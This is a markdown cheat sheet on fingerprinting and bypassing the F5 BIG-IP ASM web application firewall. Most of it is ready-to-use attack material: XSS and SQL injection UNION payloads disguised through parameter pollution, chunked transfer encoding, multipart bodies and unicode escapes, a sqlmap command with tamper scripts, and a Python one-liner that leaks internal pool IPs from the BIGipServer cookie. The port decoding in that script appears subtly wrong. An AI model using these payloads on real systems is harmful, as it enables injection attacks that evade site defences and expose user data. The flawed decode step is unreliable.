# F5 BIG-IP ASM

### Detection Signals
| Signal | Where |
|--------|-------|
| `TS` cookies (e.g., `TS01XXXXXX`) | Session tracking cookies |
| `BIGipServer*` cookie | Pool member cookie (leaks internal IP!) |
| `x-cnection: close` header | F5 header typo (known signature) |
| `server: BigIP` or `server: BIG-IP` | Server header |
| Custom block page with support ID | `The requested URL was rejected. Please consult with your administrator. Your support ID is: XXXXXXXXXX` |

### Bypass Strategy
- **Recommended tool**: Burp Suite for parameter manipulation, curl-cffi for requests
- **BIGipServer cookie decode**: Leaks internal IP. Decode: reverse hex of cookie value.
- **Parameter pollution**: ASM often checks only one instance of duplicate parameters. Send `?id=1&id=1' UNION SELECT 1,2,3--`
- **Chunked encoding**: Split payloads across Transfer-Encoding chunks.
- **HTTP/2**: Some ASM policies only inspect HTTP/1.1. Try HTTP/2 via `--http2` in curl.

### XSS Bypass
```
# F5 ASM blocks: standard XSS vectors, event handlers
# Parameter pollution bypass:
?search=innocent&search=<script>alert(1)</script>

# Chunked transfer:
Transfer-Encoding: chunked
3
<sc
4
ript
1
>
8
alert(1)
...

# Encoding chain:
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
```

### SQLi Bypass
```
sqlmap --tamper=space2mssqlhash,sp_password,between -u URL

# HPP (HTTP Parameter Pollution):
?id=1&id=' UNION SELECT 1,2,3--

# Multipart form bypass (if endpoint accepts):
Content-Type: multipart/form-data; boundary=----
------
Content-Disposition: form-data; name="id"

1' UNION SELECT 1,2,3--
------

# Chunked transfer:
Transfer-Encoding: chunked
```

### Rate Limiting
- Configurable per-policy. Default: depends on ASM policy (Rapid, Stress-based, or Behavioral).
- Behavioral detection can block even slow scanning if patterns detected.
- Recovery: Variable. Can be permanent until admin clears.

### Origin IP Discovery
```bash
# BIGipServer cookie decode — leaks internal pool member IP:
python3 -c "
import struct, sys
cookie = 'BIGipServerPool=1677787402.36895.0000'
parts = cookie.split('=')[1].split('.')
ip = struct.pack('!I', int(parts[0]))
port = struct.pack('!H', int(parts[1]))
print(f'Internal IP: {ip[3]}.{ip[2]}.{ip[1]}.{ip[0]}:{struct.unpack(\"!H\", port)[0]}')
"
```

---

